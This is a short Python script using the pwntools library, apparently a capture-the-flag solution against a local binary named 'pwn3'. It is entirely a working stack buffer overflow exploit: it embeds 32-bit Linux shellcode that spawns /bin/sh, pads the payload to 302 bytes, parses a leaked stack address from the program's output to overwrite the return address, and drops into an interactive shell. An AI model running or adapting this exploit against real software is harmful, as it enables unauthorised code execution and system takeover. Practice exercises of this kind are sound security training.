from pwn import *

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

pwn = process("./pwn3")

buf = shellcode
buf += b'\x41' * (302 - len(buf))

pwn.recvuntil(b'journey ')
input_addr = pwn.recvline()
input_addr = input_addr.decode()
input_addr = input_addr.strip("!\n")

input_addr = int(input_addr,16)
buf += p32(input_addr)

pwn.sendline(buf)
pwn.interactive()
